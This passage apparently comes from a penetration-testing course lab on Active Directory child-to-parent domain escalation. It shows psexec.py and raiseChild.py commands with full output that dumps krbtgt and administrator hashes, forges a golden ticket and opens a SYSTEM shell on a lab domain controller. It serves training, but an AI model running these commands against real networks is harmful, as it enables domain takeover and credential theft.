The ticket will be saved down to our system as a [credential cache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) (ccache) file, which is a file used to hold Kerberos credentials. Setting the `KRB5CCNAME` environment variable tells the system to use this file for Kerberos authentication attempts.

### Setting the KRB5CCNAME Environment Variable
```
[!bash!]$ export KRB5CCNAME=hacker.ccache
```

We can check if we can successfully authenticate to the parent domain's Domain Controller using [Impacket's version of Psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py). If successful, we will be dropped into a SYSTEM shell on the target Domain Controller.

### Getting a SYSTEM shell using Impacket's psexec.py
```
[!bash!]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.5.....
[*] Found writable share ADMIN$
[*] Uploading file nkYjGWDZ.exe
[*] Opening SVCManager on 172.16.5.5.....
[*] Creating service eTCU on 172.16.5.5.....
[*] Starting service eTCU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
ACADEMY-EA-DC01
```

---

## Autopwn with raiseChild.py

Impacket also has the tool `raiseChild.py`, which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. If we walk through the output, we see that it starts by listing out the child and parent domain's fully qualified domain names (FQDN). It then:
* Obtains the SID for the Enterprise Admins group of the parent domain
* Retrieves the hash for the KRBTGT account in the child domain
* Creates a Golden Ticket
* Logs into the parent domain
* Retrieves credentials for the Administrator account in the parent domain

Finally, if the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.

### Performing the Attack with raiseChild.py
```
[!bash!]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
[*] Target User account name is administrator
INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file BnEGssCE.exe
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Starting service UVNb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>exit
[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Stopping service UVNb.....
[*] Removing service UVNb.....
[*] Removing file BnEGssCE.exe.....
```

The script lists out the workflow and process in a comment as follows:

```
#   The workflow is as follows:
#       Input:
#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
#              The domain specified MUST be the domain FQDN.
#           2) Optionally a pathname to save the generated golden ticket (-w switch)
#           3) Optionally a target-user RID to get credentials (-targetRID switch)
#              Administrator by default.
#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
#              Enterprise Admin by default.
#
#       Process:
#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
#           2) Find out what the forest FQDN is (via [MS-NRPC])
#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
#              and setting expiration 10 years from now
#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
#           7) If file was specified, save the golden ticket in ccache format
#           8) If target was specified, a PSEXEC shell is launched
#
#       Output:
#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
#           2) A golden ticket saved in ccache for future fun and profit
#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
#              parameter.
```

Though tools such as `raiseChild.py` can be handy and save us time, it is essential to understand the process and be able to perform the more manual version by gathering all of the required data points. In this case, if the tool fails, we are more likely to understand why and be able to troubleshoot what is missing, which we would not be able to if blindly running this tool. 

In a client production environment, we should `always` be careful when running any sort of "autopwn" script like this, and always remain cautious and construct commands manually when possible. Other tools exist which can take in data from a tool such as BloodHound, identify attack paths, and perform an "autopwn" function that can attempt to perform each action in an attack chain to elevate us to Domain Admin (such as a long ACL attack path). 

**Avoiding tools such as these and work with tools that you understand fully, and will also give you the greatest degree of control throughout the process.**

`We don't want to tell the client that something broke because we used an "autopwn" script!`

---
